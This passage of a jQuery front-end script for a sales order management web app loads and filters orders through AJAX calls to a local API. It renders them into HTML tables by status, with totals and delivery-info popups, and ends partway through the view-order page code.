var opts = {
  lines: 13, // The number of lines to draw
  length: 10, // The length of each line
  width: 4, // The line thickness
  radius: 11, // The radius of the inner circle
  rotate: 0, // The rotation offset
  color: '#000', // #rgb or #rrggbb
  speed: 0.6, // Rounds per second
  trail: 32, // Afterglow percentage
  shadow: false, // Whether to render a shadow
  hwaccel: false, // Whether to use hardware acceleration
  className: 'spinner', // The CSS class to assign to the spinner
  zIndex: 2e9, // The z-index (defaults to 2000000000)
  top: 'auto', // Top position relative to parent in px
  left: 'auto' // Left position relative to parent in px
};
var spinner;

/*
 * This function clear the userName and password text boxes in the login page
 */


/*
 * This function initialize the order page
 * @param {int} roleId
 * @param {int} userId
 * @returns {void}
 */

function loadOrdersPage(roleId, userId, dateFrom, dateTo, customer, orderStatus, deliveryDateFrom, deliveryDateTo)
{				
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);
	
	loadFilterList();
		
	// set list value
	document.getElementById("cancelList").value = orderStatus;
	
	if (deliveryDateFrom != "")
	{
		$( "#deliveryDateFrom" ).datepicker('setDate', deliveryDateFrom);
	}
	
	if (deliveryDateTo != "")
	{
		$( "#deliveryDateTo" ).datepicker('setDate', deliveryDateTo);
	}
	
	$( "#dateFrom" ).datepicker({ 
        dateFormat: 'yy-mm-dd',
        onSelect: function (date) {
          var dateTo = $('#dateTo');
          var startDate = $(this).datepicker('getDate');
          dateTo.datepicker('option', 'minDate', startDate);
        }
    });
	
    $( "#dateTo" ).datepicker({ dateFormat: 'yy-mm-dd' });
	$( "#dateFrom" ).datepicker('setDate', dateFrom);
	$( "#dateTo" ).datepicker('setDate', dateTo);
	$( "#dateTo" ).datepicker('option','minDate', dateFrom);
	
	var data = encodeURIComponent('{"getAllSalespersonCustomerlist_data" :{ "salespersonid":"' + userId + '"}}');
	
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=getAllSalespersonCustomerlist",  
            success: function(msg){

            	var decodedJson = JSON.parse(msg);
				var data = decodedJson.data;
				
				for(var element in data)
				{
					if(data[element].value == customer)
					{
						$("#customerList").val(data[element].label); 
				        $("#customerListID").val(data[element].value);
					}
				}
				
				$('#customerList').autocomplete({
			      source: data,
			      select: function (event, ui) {
			      		event.preventDefault();
				        $("#customerList").val(ui.item.label); // display the selected text
				        $("#customerListID").val(ui.item.value); // save selected id to hidden input
				    }
			    });
				
				searchOrder(roleId, userId);
            },
			error: function (xhr, ajaxOptions, thrownError) 
        	{
				
        	}
        })
}

function getCurrencyOrderDetailsAndSalespersonCustomerInOneTime(roleId, userId)
{
	if ($('#order-cancel-check').is(':checked')){
		var showCancel = 1;
	}
	else
	{
		var showCancel = 0;
	}
	var data = encodeURIComponent('{"getCurrencyOrderAndSalespersonCustomerInOneTime_data" :{ "roleId":"' 
									+ roleId + '","showCancel":"' + showCancel + '","userId":"' + userId + '"}}');
	
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=getCurrencyOrderAndSalespersonCustomerInOneTime",  
            success: function(msg){
                
                // debugger
             	var decodedJson = JSON.parse(msg);
             	
             	
				var data = decodedJson.salesperson_data;

				// var header = "<option value=''>-- Select salesperson --</option>";
							
				// $('#customerList').append(header);
				
				// if(data != false && data != undefined)
	  	// 		{
	  	// 			 for (var i = 0; i < data.length; i++)
    //      			 {    	
				// 		var salesperson = "<option value='" + data[i].login_id + "'>" + data[i].name + "</option>";
						
				// 		$('#customerList').append(salesperson);
    //      			 }
	  	// 		}

             	
           
				var data = decodedJson.currency_data;
				var currency = '';
				
     			for(var i = 0; i < data.length; i++)
     			{
     				currency =  data[i].currency;
     			}

				document.getElementById("currency").value = currency;
             	
             	
             	
				var data = decodedJson.order_data;

				if(data != false && data != undefined)
	  			{
	  				initOrderTable(data,roleId,userId);
	  			}
	  			
	  			spinner.stop(); 
				$('#mydiv').remove(); 
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
				spinner.stop(); 
				$('#mydiv').remove(); 
          }
        });
}

/*
 * This function will get currency of the system
 * @returns {string}
 */

function getCurrency()
{
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "action=getCurrency",  
            success: function(msg){
                            	
             	var decodedJson = JSON.parse(msg);
				var data = decodedJson.data;
				var success = decodedJson.success;

				var currency = '';
				
				if(success != false && success != undefined)
     			{
     				if(success == 0)
     				{
     					//alert("No currency found");
     				}
     				else
     				{
     					for(var i = 0; i < data.length; i++)
     					{
     						currency =  data[i].currency;
     					}
     				}
     			}
     			else
     			{
     				//alert("No currency found");
     			}

				document.getElementById("currency").value = currency;
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
            
          }
        });
}

/*
 * This function will get all orders or salesperson's own order
 * @param {int} roleId
 * @param {int} userId
 * @returns {void}
 */

function getAllOrdersDetails(roleId, userId)
{	
	var data = encodeURIComponent('{"getAllOrders_data" :{ "roleId":"' + roleId + '","userId":"' + userId + '"}}');
		
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=getAllOrders",  
            success: function(msg){
                            	
             	var decodedJson = JSON.parse(msg);
				var data = decodedJson.data;

				if(data != false && data != undefined)
	  			{
	  				initOrderTable(data,roleId);
	  			}
	  			else
	  			{
	  				//alert('No order found');
	  			}
	  			
	  			spinner.stop(); 
				$('#mydiv').remove(); 
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
				spinner.stop(); 
				$('#mydiv').remove(); 
          }
        });
}

/*
 * This function will set up the calendar drop down list
 * @returns {void}
 */

function loadCalendar(currentDate,currentMonth,currentYear)
{		
	var startFromYear = 1990;
	
	// var currentYear = new Date().getFullYear();

	// var currentMonth = new Date().getMonth();

	// var currentDate = new Date().getDate();
	// debugger
		
	for(var i = startFromYear; i <= currentYear; i++)
	{
		if(i == startFromYear)
        {
         	var header = "<option value=''>-- Select year --</option>";
							
			$('#yearList').append(header);
        }
        
        var value = "<option value='" + i + "'>" + i + "</option>";
						
		$('#yearList').append(value);
	}

	$('#yearList').val(currentYear);

	var yearListener = document.getElementById("yearList");
	
	yearListener.onchange = function(){
		
		var selectedYear = yearListener.options[yearListener.selectedIndex].value;
    	    	
    	if(selectedYear == '')
    	{
    		// reset day list
    		
    		$('#dayList').empty();
    		
    		var header = "<option value=''>-- Select Day --</option>";
							
			$('#dayList').append(header);
    		
    		return;
    	}
		
		// if month ad gt value
		
		var monthListener = document.getElementById("monthList");
		
		var selectedMonth = monthListener.options[monthListener.selectedIndex].value;
		
		if(selectedMonth != '')
		{
			// check if leap year
    	
   	 		var decider = leapYear(selectedYear);
    		    		
    		setUpDaysDropDownList(decider, selectedMonth);
		}
	};
		
	var Months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
	
	for(var i = 0; i < Months.length; i++)
	{
		if(i == 0)
        {
         	var header = "<option value=''>-- Select month --</option>";
							
			$('#monthList').append(header);
        }
         			 	
		var value = "<option value='" + (i+1) + "'>" + Months[i] + "</option>";
						
		$('#monthList').append(value);
	}
	// debugger
	if (currentMonth != ''){
		currentMonth = parseInt(currentMonth);
	}
	$('#monthList').val(currentMonth);
	
	var decider_new = leapYear(currentYear);
    	    		
	setUpDaysDropDownList(decider_new, currentMonth);

	var monthListener = document.getElementById("monthList");

	monthListener.onchange = function(){
    	
    	var selectedMonth = monthListener.options[monthListener.selectedIndex].value;
    	    	
    	if(selectedMonth == '')
    	{
    		return;
    	}
    		
    	var year = document.getElementById("yearList");
    	
    	var selectedYear = year.options[year.selectedIndex].value;

    	// check if leap year
    	
   	 	var decider = leapYear(selectedYear);
    	    		
    	setUpDaysDropDownList(decider, selectedMonth);
    	// debugger
	};
	
	var header = "<option value=''>-- Select Day --</option>";
								
	$('#dayList').append(header);


	$('#dayList').val(currentDate);
	// debugger
}

/*
 * This function initialize day drop down list
 * @param {bool} isLeapYear
 * @param {int} selectedMonth
 * @returns {int}
 */

function setUpDaysDropDownList(isLeapYear, selectedMonth)
{
	$('#dayList').empty();
	
	var dayOfNotLeapYear = ["31", "28", "31", "30", "31", "30", "31", "31", "30", "31", "30", "31"];

	var dayOfLeapYear = ["31", "29", "31", "30", "31", "30", "31", "31", "30", "31", "30", "31"];

	var header = "<option value=''>-- Select Day --</option>";
							
	$('#dayList').append(header);
			
	if(isLeapYear)
	{
		selectedMonth = selectedMonth - 1;
				
		for(var i = 0; i < dayOfLeapYear[selectedMonth]; i++)
		{
			var value = "<option value='" + (i+1) + "'>" + (i+1) + "</option>";
						
			$('#dayList').append(value);
		}
	}
	else
	{	
		selectedMonth = selectedMonth - 1;
				
		for(var i = 0; i < dayOfNotLeapYear[selectedMonth]; i++)
		{
			var value = "<option value='" + (i+1) + "'>" + (i+1) + "</option>";
						
			$('#dayList').append(value);
		}
	}
}

/*
 * This function determine if passing year is leap year
 * @param {int} year
 * @returns {int}
 */

function leapYear(year)
{
	return ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
}

/*
 * This function initialize order status filter list
 */

function loadFilterList()
{
	var header = "<option value=''>-Select Order Status-</option>";
	var orderStatus = ["Active", "Delete by Agent", "Delete by Admin"];
	
	$('#cancelList').append(header);

	for(var i = 0; i <3; i++)
	{
		var value = "<option value='" + i + "'>" + orderStatus[i] + "</option>";
					
		$('#cancelList').append(value);
	}
}



function searchOrder(roleId, userId)
{	
	// get selected value of 4 drop down list	
	if ($('#order-cancel-check').is(':checked'))
	{
		var showCancel = 1;
	}
	else
	{
		var showCancel = 0;
	}
	
	var selectedSalespersonId = userId;
	
	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()

	var deliveryDateFrom = $('#deliveryDateFrom').val();
	var deliveryDateTo = $('#deliveryDateTo').val()
	
	var orderList = document.getElementById("cancelList");
	var orderStatus = orderList.options[orderList.selectedIndex].value;

	var customerList = document.getElementById("customerList");
	var customerStatus = '';
	
	if (customerList.value != "")
	{
		customerStatus = $('#customerListID').val();
	}
	
	
	
	if( deliveryDateFrom == '' && deliveryDateTo == '' &&  dateFrom == '' && dateTo == '' && orderStatus == ''  && customerStatus == '')
	{
		alert("Please select a criteria to start search");
		
		spinner.stop(); 
		$('#mydiv').remove(); 
		
		return;
	}

	var data = encodeURIComponent('{"searchOrders_data" :{ "salespersonId":"' + selectedSalespersonId + '","showCancel":"' + showCancel
									+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","order_status":"' 
									+ orderStatus + '","customer_status":"' + customerStatus 
									+ '","deliveryDateFrom":"' + deliveryDateFrom + '","deliveryDateTo":"' + deliveryDateTo + '"}}');
		// debugger;									
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);
		
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=searchOrders",  
            success: function(msg){
                        // debugger;    	
            	var decodedJson = JSON.parse(msg);
            	var data = decodedJson.currency_data;
				var currency = '';
				
     			for(var i = 0; i < data.length; i++)
     			{
     				currency =  data[i].currency;
     			}

				document.getElementById("currency").value = currency;

				var data = decodedJson.data;
				var deliveryInfo = decodedJson.delivery_info;
				var enable_deliver_date = decodedJson.enable_deliver_date;
				

				if(data != false && data != undefined)
	  			{
	  				$('#ordersTableId').empty();
	  				$('#ordersTableQNEId').empty();
	  				$('#ordersTableComfirmedId').empty();

	  				initOrderTable(data,roleId,userId,deliveryInfo,enable_deliver_date);
	  			}
	  			else
	  			{
	  				$('#ordersTableId').empty();
	  				$('#ordersTableQNEId').empty();
	  				$('#ordersTableComfirmedId').empty();

	  				// alert('No order found');
	  			}
	  			
	  			spinner.stop(); 
				$('#mydiv').remove(); 
				$('#mydiv').remove(); 
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
				spinner.stop(); 
				$('#mydiv').remove(); 
          }
    });
}

/*
 * This function will initialize the order table with the passing parameter
 * @param {int} data
 * @returns {int}
 */

function initOrderTable(data, roleId,userId,deliveryInfo,enable_deliver_date)
{
	var currency = document.getElementById("currency").value;
		
	var header = '<tr class="orderTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Order No</td>'
	                    + '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>' 
	                    + '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
	                    + '<td style="text-align:left; padding-left:5px;">Status</td><td style="text-align:left; padding-left:5px;">Picking Status</td></tr>';

	var header2 = '<tr class="orderTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Order No</td>'
	                    + '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>' 
	                    + '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
	                    + '<td style="text-align:left; padding-left:5px;">Picking Status</td><td style="text-align:left; padding-left:5px;"></td></tr>';
	var orderkey = 0;
	var comfirmkey = 0;
	var sentkey = 0;
	var totalAmount_cart = 0;
	var totalAmount_confirmed = 0;
	var totalAmount_qne = 0;

	$('#ordersTableId').append(header);
	$('#ordersTableQNEId').append(header2);
	$('#ordersTableComfirmedId').append(header);
	
	for (var i = 0; i < data.length; i++)
    {    
	 	var orderId = data[i].order_id;
	 	var cust_company_name = data[i].cust_company_name;
	 	var orderDate = data[i].order_date;
	 	var deliveryDate = data[i].delivery_date;
	 	var salesAgent = data[i].sales_agent
	 	var grandTotal = data[i].grand_total;
	 	var orderStatus = data[i].order_status;
	 	var cancelStatus = data[i].cancel_status;
	 	var packingStatus = data[i].packing_status;
	 	var orderStatusLastUpdateDate = data[i].order_status_last_update_date;
	 	var orderStatusLastUpdateBy = data[i].order_status_last_update_by;   
	 	var orderInternalUpdate = data[i].internal_updated_at; 
	 	var orderDeliveryNote = data[i].order_delivery_note;      
	 	var statusMsg, lastUpdateByWhenAndWho = '';
	 	var deliveryMessage = data[i].delivery_info;
	 	
	 	orderStatusLastUpdateDate = orderStatusLastUpdateDate;
	 	lastUpdateByWhenAndWho =orderStatusLastUpdateBy + '| ' + orderInternalUpdate;
	 	
	 	orderDate = orderDate.substr(0, 10);
	 	// debugger
	 	
	 	if (orderStatus==0){
	 		
	 		orderkey += 1;
	 		if (cancelStatus == 0)
	 		{
	 			totalAmount_cart += Number(grandTotal);
	 			cancelStatus = '<td style="padding:5px; border:none ;width:8%;" class="cancelStatus"> Active <br><b style="background-color:yellow;">' 
	 						+  orderDeliveryNote;
	 			if(enable_deliver_date == 1) {
		            cancelStatus  += '<br>' + deliveryDate;
		          }
		          cancelStatus += ' </b></td>';
	 		}
	 		else if (cancelStatus == 1)
	 		{
	 			grandTotal = 0;
	 			cancelStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
	 		}
	 		else
	 		{
	 			grandTotal = 0;
	 			cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
	 		}

	 		// if (packingStatus == 0)
	 		// {
	 		// 	packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
	 		// }
	 		// else 
	 		if (packingStatus == 1)
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus">Completed</td>';
	 		}
	 		else if (packingStatus == 2)
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus">Completed (partial no stock)</td>';
	 		}
	 		else
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus">!!!</td>';
	 		}
		 	var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
	                orderkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
	                + '\')" >' + orderId + '<br>' + cust_company_name + '<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
	                + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
	                + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
	                '</form></a></div></td><td style="padding:5px;border:none; width:8%; text-align:left;">' +
	                orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
	                salesAgent + '</td>' + '<td style="padding:5px;border:none; width:8%; text-align:left;" class="orderCurrency">' 
	                + currency + " " + Number(grandTotal).toFixed(2) + '</td>' 
	                + '<td style="padding:5px;border:none; width:9%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
	                + '<td style="padding:5px;border:none; width:17%; text-align:left;" class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
	                + cancelStatus
	                + packingStatus + '</tr>';

			$('#ordersTableId').append(record);
		} 
		else if  (orderStatus==1){
			
			comfirmkey += 1;
			if (cancelStatus == 0)
	 		{
	 			totalAmount_confirmed += Number(grandTotal);
	 			cancelStatus = '<td style="padding:5px; border:none ;width:15%;" class="cancelStatus"><b style="background-color:yellow;">' 
	 						+  orderDeliveryNote ;
	 			if(enable_deliver_date == 1) {
		            cancelStatus  += '<br>' + deliveryDate;
		          }
		          cancelStatus += ' </b>';
				if(deliveryInfo == 1){
	 				var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
	 				cancelStatus += '<br><div id="delivery-info-'+ orderId +'">';
					if (deliveryMessage == null){
						deliveryMessage = '';
					}
					else{
						cancelStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
					}
					cancelStatus += '<button type="button" style="width:90%;height:30px;"  onclick="openMessageBoxDelivery(' + orderId +',\'desktop\')" >Delivery Info</button></div>';
					cancelStatus += '<div id="message-popup-' + orderId +'" title="Delivery Info for order ' + orderId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="'+deliveryPlaceholder+ '">'+
								deliveryMessage +'</p></div>';
				}
				cancelStatus += '</td>'
	 		}
	 		else if (cancelStatus == 1)
	 		{
	 			grandTotal = 0;
	 			cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
	 		}
	 		else
	 		{
	 			grandTotal = 0;
	 			cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
	 		}

	 		// if (packingStatus == 0)
	 		// {
	 		// 	packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
	 		// }
	 		// else 
	 		// debugger;
	 		if (packingStatus == 1)
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus">Completed</td>';
	 		}
	 		else if (packingStatus == 2)
	 		{

	 			packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus">Completed (partial no stock)</td>';
	 		}
	 		else
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus">!!!</td>';
	 		}
	 		
		 	var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
	                comfirmkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
	                + '\')" >' + orderId + '<br>' + cust_company_name + '<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
	                + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
	                + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
	                '</form></a></div></td><td style="padding:5px;border:none; width:8%; text-align:left;">' +
	                orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
	                salesAgent + '</td>' + '<td style="padding:5px;border:none; width:8%; text-align:left;" class="orderCurrency">' 
	                + currency + " " + Number(grandTotal).toFixed(2) + '</td>' + '<td style="padding:5px;border:none; width:9%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
	                + '<td style="padding:5px;border:none; width:17%; text-align:left;"  class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
	                + cancelStatus
	                + packingStatus + '</tr>';

			$('#ordersTableComfirmedId').append(record);
		} 
		else if (orderStatus==2){
			totalAmount_qne += Number(grandTotal);
			sentkey += 1;
			// if (packingStatus == 0)
	 	// 	{
	 	// 		packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
	 	// 	}
	 	// 	else 
	 		if (packingStatus == 1)
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus">Completed<br><b style="background-color:yellow;">' 
	 						+  orderDeliveryNote;
	 			if(enable_deliver_date == 1) {
		            packingStatus  += '<br>' + deliveryDate;
		          }
		          packingStatus += ' </b>';
	 		}
	 		else if (packingStatus == 2)
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus">Completed (partial no stock)<br><b style="background-color:yellow;">' 
	 						+  orderDeliveryNote;
	 			if(enable_deliver_date == 1) {
		            packingStatus  += '<br>' + deliveryDate;
		          }
		          packingStatus += ' </b>';
	 		}
	 		else
	 		{
	 			packingStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="packingStatus">!!!<br><b style="background-color:yellow;">' 
	 						+  orderDeliveryNote ;
	 			if(enable_deliver_date == 1) {
		            packingStatus  += '<br>' + deliveryDate;
		          }
		          packingStatus += ' </b>';
	 		}

	 		if(deliveryInfo == 1){
		        var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
		        packingStatus += '<br><div id="delivery-info-'+ orderId +'">';
		        if (deliveryMessage == null){
		          deliveryMessage = '';
		        }
		        else{
		          packingStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
		        }
		        packingStatus += '<button type="button" style="width:90%;height:30px;"  onclick="openMessageBoxDelivery(' + orderId +',\'desktop\')" >Delivery Info</button></div>';
		        packingStatus += '<div id="message-popup-' + orderId +'" title="Delivery Info for order ' + orderId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="'+deliveryPlaceholder+ '">'+
		              deliveryMessage +'</p></div>';
		     }
		     packingStatus += '</td>'
	 
			var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
	                sentkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
	                + '\')" >' + orderId + '<br>' + cust_company_name +'<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
	                + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
	                + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
	                '</form></a></div></td><td style="padding:5px;border:none; width:12%; text-align:left;">' +
	                orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
	                salesAgent + '</td>' + '<td style="padding:5px;border:none; width:12%; text-align:left;" class="orderCurrency">' 
	                + currency + " " + Number(grandTotal).toFixed(2) + '</td>' + '<td style="padding:5px;border:none; width:15%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
	                + '<td style="padding:5px;border:none; width:17%; text-align:left;"  class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
	                + packingStatus 
	                +'</tr>';
		
			$('#ordersTableQNEId').append(record);
		}
	}

	record = '';
	record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
            '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
            '<td style="padding:5px;border:none; width:12%; text-align:left;">' +
            '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
            'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">' 
            + currency + " " + Number(totalAmount_cart).toFixed(2) + 
            '</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>' 
            + '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>' 
            +'<td style="padding:5px; border:none ;width:8%; "></td></tr>';
    $('#ordersTableId').append(record);

    record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
            '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
            '<td style="padding:5px;border:none; width:12%; text-align:left;">' +
            '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
            'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">' 
            + currency + " " + Number(totalAmount_confirmed).toFixed(2) + 
            '</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>' 
            + '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>' 
            +'<td style="padding:5px; border:none ;width:8%; "></td></tr>';
    $('#ordersTableComfirmedId').append(record);

    record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
            '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
            '<td style="padding:5px;border:none; width:12%; text-align:left;">' +
            '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
            'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">' 
            + currency + " " + Number(totalAmount_qne).toFixed(2) + 
            '</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>' 
            + '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>' 
            +'<td style="padding:5px; border:none ;width:8%; "></td></tr>';
    $('#ordersTableQNEId').append(record);
}

/*This function redirect user to view order page
 * @param {int} formId
 * @returns{void}
 */


function redirectToViewOrderPage(formId)
{
	formId = "#"+formId;
		    
    $(formId).submit();
}



/*
 * This function initialize the view order page
 * @param {int} roleId
 * @param {int} userId
 * @returns {void}
 */

function loadViewOrderPage(roleId, orderId, userId, currency)
{
	// resizeLeftMenuLoginLogoImage();
	
	// getModuleListByRoleId(roleId);
	
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);
	
	
	// getListOfOrderStatus();
	// getViewingOrderDetails(orderId, currency);

	getOrderStatusAndOrderDetailInOneTime(orderId, currency, userId);
}

function getOrderStatusAndOrderDetailInOneTime(orderId, currency, userId)
{	
	var data = encodeURIComponent('{"getOrderStatusAndOrderDetailInOneTime_data" :{ "orderId":"' + orderId +'"}}');
	
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=getOrderStatusAndOrderDetailInOneTime",  
            success: function(msg){
            	                         // debugger   	
            	var decodedJson = JSON.parse(msg);
            	
            	
            	
	         	// var data = decodedJson.orderStatus_data;
	         
	         	if(data!=false && data!=undefined)
	         	{           		
	           		localStorage["orderStatusArray"] = JSON.stringify(data);       		
	         	}

            	
            	            	
				var data = decodedJson.order_data;

				if(data != false && data != undefined)
	  			{
	  				for (var i = 0; i < data.length; i++)
    				{
    					var orderId = data[i].order_id;
	 					var orderDate = data[i].order_date;
						var custCompName = data[i].cust_company_name;
						var custInchargePerson = data[i].cust_incharge_person;
						var grandTotal = data[i].grand_total;
						grandTotal = (+grandTotal).toFixed(2);
						var orderStatus = data[i].order_status;
						var cancelStatus = data[i].cancel_status;
						var packingStatus = data[i].packing_status;
						var othersOrderStatus = data[i].others_order_status;
						var orderStatusLastUpdateDate = data[i].order_status_last_update_date;
						var orderStatusLastUpdateBy = data[i].order_status_last_update_by;
						
						var customerCode = data[i].cust_code;
						var customerFax = data[i].cust_fax;
	 					var customerTel = data[i].cust_tel;
						var customerEmail = data[i].cust_email;
						var customerReference = data[i].cust_reference;
						var salespersonId = data[i].salesperson_id;
						var salesagent = data[i].sales_agent;

						var shippingAddr1 = data[i].shipping_address1;
						var shippingAddr2 = data[i].shipping_address2;
						var shippingAddr3 = data[i].shipping_address3;
						var shippingAddr4 = data[i].shipping_address4;
						var billingAddr1 = data[i].billing_address1;
						var billingAddr2 = data[i].billing_address2;
						var billingAddr3 = data[i].billing_address3;
						var billingAddr4 = data[i].billing_address4;
						
						var shippingCity = data[i].shipping_city;
						var shippingState = data[i].shipping_state;
						var shippingZipcode = data[i].shipping_zipcode;
						var shippingCountry = data[i].shipping_country;
						
						var billingCity = data[i].billing_city;
						var billingState = data[i].billing_state;
						var billingZipcode = data[i].billing_zipcode;
						var billingCountry = data[i].billing_country;
						
						var orderTotalDiscount = data[i].total_discount;
						var orderTotalDiscountMethod = data[i].discount_method;
						
						var order_remark = data[i].order_remark;
                        var order_validity = data[i].order_validity;
                        var order_payment_type = data[i].order_payment_type;
                        var order_reference = data[i].order_reference;
                        var order_delivery_note = data[i].order_delivery_note;
						
						var shippingFee = data[i].shippingfee;
						var tax = data[i].tax;
						
						var orderItemList = data[i].orderItemArr;
						var showAgent = '';
						var showPicking = '';

						var decimal_point = parseInt(data[i].decimal_point);
						var accounting_software = data[i].accounting_software;
						var gst_rate = parseFloat(data[i].gst_rate);

						var record = '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Code</td><td style="width:1%;">:</td><td style="width:32%;">'+ customerCode +'</td><td style="width:17%; padding-left:15px;">Billing State</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingState +'</td></tr>'
